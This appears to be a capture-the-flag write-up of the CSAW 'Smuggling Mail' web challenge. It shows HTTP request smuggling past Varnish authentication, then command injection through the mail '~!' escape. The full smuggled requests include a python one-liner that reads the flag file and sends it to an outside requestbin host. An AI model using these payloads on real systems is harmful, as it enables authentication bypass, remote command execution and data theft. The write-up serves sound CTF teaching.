<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><title>Smuggling Mail</title><link href=https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css rel=stylesheet integrity=sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js integrity=sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa crossorigin=anonymous></script>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Inconsolata&family=Poppins&display=swap" rel=stylesheet><link rel=stylesheet href=https://bfe.one/css/custom.css></head><body><style>.nav_shadow{box-shadow:0 0 14px rgba(0,0,0,.5);-webkit-box-shadow:0 0 14px 0 rgba(0,0,0,.5)}.navbar-custom{background-color:#333c33;font-size:16pt}.navbar-custom *{color:#fff;font-family:poppins,sans-serif}</style><nav class="navbar navbar-expand-lg navbar-dark nav_shadow navbar-custom"><div class=container><div class=container-fluid><button class=navbar-toggler type=button data-bs-toggle=collapse data-bs-target=#navbarSupportedContent aria-controls=navbarSupportedContent aria-expanded=false aria-label="Toggle navigation">
<span class=navbar-toggler-icon></span></button><div class="collapse navbar-collapse" id=navbarSupportedContent><ul class="navbar-nav me-auto mb-2 mb-lg-0"><li class=nav-item><a class=nav-link href=/><strong>Home</strong></a></li><li class=nav-item><a class=nav-link href=/about/><strong>About</strong></a></li><li class=nav-item><a class=nav-link href=/roster/><strong>Roster</strong></a></li><li class=nav-item><a class=nav-link href=/writeups/><strong>Writeups</strong></a></li></ul></div></div></div></nav><br><div id=content><div class="container col-lg-8"><h1>Smuggling Mail</h1><span>By CDT Daniel Chung
<span><br><hr class="hr hr-blurry"><p>What could possibly go wrong with having your reverse proxy handle all authentication?</p><h2 id=description>Description</h2><p>Join our waitlist and we&rsquo;ll let you know about apartment vacancies!</p><p><a href=http://web.chal.csaw.io:5009/>http://web.chal.csaw.io:5009/</a></p><h2 id=tldr>TL;DR</h2><p>Smuggle an HTTP request through Varnish to <code>/admin/alert</code> and use a command exploit for <code>mail</code> to send the flag to an external website.</p><h3 id=first-steps>First Steps</h3><p>I downloaded the source code to look around a little bit. Inside the <code>package.json</code> file and <code>server.js</code> file, I found a couple of libraries that I have never seen before.</p><ul><li><a href=https://github.com/bkardell/Hitch>hitch</a> is a css library to restyle the interface</li><li>varnish is a http accelerator and reverse proxy,<a href=https://www.npmjs.com/package/varnish>npm site</a> and <a href=https://www.sitepoint.com/how-to-boost-your-server-performance-with-varnish/>description</a></li><li>Varnish seems to be performing the authentication for the server and not express.</li><li>The name <code>Smuggling Mail</code> makes me think that this is <a href=https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling>Request Smuggling</a></li></ul><h3 id=a-rabbit-hole>A Rabbit Hole</h3><p>I originally thought that this was going to be either a <code>CL.TE</code> or <code>TE.CL</code> request smuggling exploit. After trying this for a while, I asked the admins if this was the right exploit to chase. They responded saying that it wasn&rsquo;t, so back to the drawing board.</p><h3 id=right-path>Right Path</h3><p>Varnish is a reverse proxy program and a load balancer. In it&rsquo;s current state for the program, it serves as an endpoint user authenticator, as it authenticates all requests to <code>/admin</code> here:</p><pre tabindex=0><code class=language-vcl data-lang=vcl>sub vcl_recv {
    if (req.url ~ &#34;/admin&#34; &amp;&amp; !(req.http.Authorization ~ &#34;^Basic TOKEN$&#34;)) {
        return (synth(403, &#34;Access Denied&#34;));
    }
}
</code></pre><p>The express server that is running does not authenticate any requests to the actual backend server. Therefore, I can use request smuggling to get to <code>/waitlist</code>, and then ask for <code>/admin/alert</code> right after using a <code>Content-Length: 0</code> header. After a little bit of testing with a local instance, I can confirm that the smuggling works with a post to <code>/waitlist</code> then <code>/admin/</code>. This was done with burpsuite repeater.</p><pre tabindex=0><code>POST /waitlist HTTP/2
Host: localhost:8083
Content-Length: 0

GET /admin/ HTTP/1.1
Host: localhost:8083
</code></pre><p>The request there manages to show the admin panel in the response body. Continuing to use this exploit, I now switched to posting to the <code>/admin/alert</code> endpoint. Looking at the source, I see that the post request must have a message body in json labeled as <code>msg</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>express</span>.<span style=color:#a6e22e>json</span>());
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#75715e>// Emergency alert email notification system for all residents
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/admin/alert&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>msg</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>proc</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>spawn</span>(<span style=color:#e6db74>&#34;mail&#34;</span>, [<span style=color:#e6db74>&#34;-s&#34;</span>, <span style=color:#e6db74>&#34;ALERT&#34;</span>, <span style=color:#e6db74>&#34;all_residents@localhost&#34;</span>], {<span style=color:#a6e22e>timeout</span>});
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>proc</span>.<span style=color:#a6e22e>stdin</span>.<span style=color:#a6e22e>write</span>(<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>msg</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>proc</span>.<span style=color:#a6e22e>stdin</span>.<span style=color:#a6e22e>end</span>();
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>setTimeout</span>(() =&gt; { <span style=color:#a6e22e>kill</span>(<span style=color:#a6e22e>proc</span>.<span style=color:#a6e22e>pid</span>); }, <span style=color:#a6e22e>timeout</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>();
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>After messing with a local instance, I modified the server script to output the request body into <code>/tmp/output.txt</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75715e>// Emergency alert email notification system for all residents
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/admin/alert&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>msg</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>writeFile</span>(<span style=color:#e6db74>&#34;/tmp/output.txt&#34;</span>, <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>msg</span>, <span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>err</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }); 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>proc</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>spawn</span>(<span style=color:#e6db74>&#34;mail&#34;</span>, [<span style=color:#e6db74>&#34;-s&#34;</span>, <span style=color:#e6db74>&#34;ALERT&#34;</span>, <span style=color:#e6db74>&#34;all_residents@localhost&#34;</span>], {<span style=color:#a6e22e>timeout</span>});
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>proc</span>.<span style=color:#a6e22e>stdin</span>.<span style=color:#a6e22e>write</span>(<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>msg</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>proc</span>.<span style=color:#a6e22e>stdin</span>.<span style=color:#a6e22e>end</span>();
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>setTimeout</span>(() =&gt; { <span style=color:#a6e22e>kill</span>(<span style=color:#a6e22e>proc</span>.<span style=color:#a6e22e>pid</span>); }, <span style=color:#a6e22e>timeout</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>writeFile</span>(<span style=color:#e6db74>&#34;/tmp/output.txt&#34;</span>, <span style=color:#e6db74>&#34;got a post&#34;</span>, <span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>err</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }); 
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>();
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>Where my request body was written to be the following:</p><pre tabindex=0><code>POST /waitlist HTTP/2
Host: https://localhost:8080
Content-Length: 0

POST /admin/alert HTTP/1.1
Host: https://localhost:8080
Content-Type: application/json
Content-Length: 14

{&#34;msg&#34;:&#34;test&#34;}
</code></pre><p>After running the same request, attaching to the docker container using <code>docker exec -ti DOCKER_ID /bin/bash</code>, and looking at <code>/tmp/</code>, we see that our request is actually going through and is outputting our <code>msg</code> data in <code>output.txt</code>. Our next step is figuring out how to read and exfil the flag data. I need to have command execution through the <code>proc.stdin.write</code> into the <code>mail</code> process.</p><p>After googling around for quite a while, I found an RCE <a href=https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm>here</a> that describes an exploit with <code>~!</code> in mail, an escape that executes a specified command and returns to the mail compose mode. The <a href=https://mailutils.org/manual/mailutils.html#index-_007e_0021_002c-mail-escape>manual</a> pages go more into depth on this. Trying this exploit out with <code>~! cat /app/flag.txt"</code> directly in <code>mail</code> shows that the flag is read correctly. Testing this out through burp shows the same result.</p><pre tabindex=0><code>POST /waitlist HTTP/2
Host: localhost:8083
Content-Length: 0

POST /admin/alert HTTP/1.1
Host: localhost:8083
Content-Type: application/json
Content-Length: 43

{&#34;msg&#34;:&#34;~! cp /app/flag.txt /tmp/flag.txt&#34;}
</code></pre><pre tabindex=0><code>root@49cc51351ff2:/tmp# cat flag.txt
flag{t35t_f14g_g035_h3r3}
</code></pre><p>At first I tried to overwrite the public <code>index.html</code> with the flag with <code>{"msg":"~! cat /app/flag.txt >> /app/public/index.html"}</code>, but it doesn&rsquo;t seem like I am able to overwrite files. So now to exfil another way. Using <code>apt list</code>, I saw that <code>python2.7</code> was installed. This is great, as we can easily use libraries to request to an external website without having to use sockets directly from bash. Testing a custom <code>python2.7</code> command shows that we can read the file and send it to a <a href=https://requestbin.com/>requestbin</a>, which I tested <a href=https://requestbin.com/r/eno4g82ze6nt9/2EbpHsodXSPYk4HE3FGxEhnChRd>locally</a>.</p><pre tabindex=0><code>POST /waitlist HTTP/2
Host: localhost:8083
Content-Length: 0

POST /admin/alert HTTP/1.1
Host: localhost:8083
Content-Type: application/json
Content-Length: 138

{&#34;msg&#34;: &#34;~! python -c &#39;import urllib2; f=open(\&#34;/app/flag.txt\&#34;).read(); urllib2.urlopen(\&#34;https://eno4g82ze6nt9.x.pipedream.net/?\&#34;+f)&#39;&#34;}
</code></pre><p>And success! My requestbin showed the test flag, from here I switched to the public server, and got the real flag.</p><h3 id=solve>Solve</h3><pre tabindex=0><code>POST /waitlist HTTP/2
Host: https://web.chal.csaw.io:5009
Content-Length: 0

POST /admin/alert HTTP/1.1
Host: https://web.chal.csaw.io:5009
Content-Type: application/json
Content-Length: 138

{&#34;msg&#34;: &#34;~! python -c &#39;import urllib2; f=open(\&#34;/app/flag.txt\&#34;).read(); urllib2.urlopen(\&#34;https://eno4g82ze6nt9.x.pipedream.net/?\&#34;+f)&#39;&#34;}
</code></pre><h3 id=flag>Flag</h3><pre tabindex=0><code>flag{5up3r_53cr3t_4nd_c001_f14g_g035_h3r3}
</code></pre></div></div><footer class="footer mt-auto"><div class="container text-center text-muted"><p>Copyrights Â© 2022 BitsforEveryone. All rights reserved.</p><div class=social><a href=https://www.instagram.com/armywp_cyber/ class="fa fa-instagram"></a>
<a href=https://github.com/bitsforeveryone class="fa fa-github"></a></div></div></footer></body></html>